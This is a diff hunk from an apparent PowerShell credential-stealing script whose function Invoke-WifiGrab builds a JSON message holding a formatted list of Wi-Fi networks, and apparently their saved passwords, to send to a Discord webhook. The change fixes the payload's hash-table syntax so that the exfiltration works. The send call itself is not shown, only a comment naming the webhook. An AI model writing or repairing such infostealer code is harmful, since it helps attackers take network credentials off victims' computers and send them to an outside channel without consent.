@@ -45,15 +45,15 @@ function Invoke-WifiGrab {
 
     # Prepare JSON payload
     $jsonData = @{
-        content = "null",
-        "embeds": [
-            {
-                "title": "Wi-fi List:",
-                "description": "$formattedWiFiString",
-                "color": 1422226
+        content = "null"
+        embeds = @(
+            @{
+                title = "Wi-fi List:"
+                description = $formattedWiFiString
+                color = 1422226
             }
-        ],
-        "attachments": []
+        )
+        attachments = @()
     } | ConvertTo-Json
 
     # Send data to Discord webhook
